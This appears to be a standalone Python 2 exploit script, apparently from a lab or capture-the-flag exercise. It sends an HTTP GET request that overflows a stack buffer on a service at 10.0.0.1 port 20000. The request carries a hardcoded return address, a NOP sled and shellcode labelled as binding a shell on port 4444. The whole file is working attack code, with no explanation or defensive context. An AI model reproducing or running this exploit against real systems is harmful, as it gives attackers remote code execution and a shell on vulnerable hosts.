#!/usr/bin/env python
import socket

#bind on 4444
buf =  ""
buf += "\xb8\xcc\x46\xc9\x39\xdb\xc0\xd9\x74\x24\xf4\x5b\x31"
buf += "\xc9\xb1\x14\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x2e"
buf += "\xb3\xf8\xe2\x59\xdf\xa8\x57\xf6\x4a\x4d\xd1\x19\x3a"
buf += "\x37\x2c\x59\x60\xe6\xfc\x31\x95\x16\x10\x9d\xf3\x06"
buf += "\x43\x4d\x8d\xc6\x09\x0b\xd5\xc5\x4e\x5a\xa4\xd1\xfd"
buf += "\x58\x97\xbc\xcc\xe0\x94\xf0\xa9\x2d\x9a\x62\x6c\xc7"
buf += "\xa4\xdc\x42\x97\x92\xa5\xa4\xff\x0b\x79\x26\x97\x3b"
buf += "\xaa\xaa\x0e\xd2\x3d\xc9\x80\x79\xb7\xef\x90\x75\x0a"
buf += "\x6f"

TCP_IP = '10.0.0.1'
TCP_PORT = 20000
BUFFER_SIZE = 1024
eip = "\xe5\xf3\xff\xbf" # 0xbffff3e5

bof = "GET /"+"A"*139 + eip +" HTTP/1.1"+"\x90"*30+buf+"\xCC"*(770-len(buf))+"\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print "received data:", data
s.send(bof)
data = s.recv(BUFFER_SIZE)
s.close()

print "received data:", data
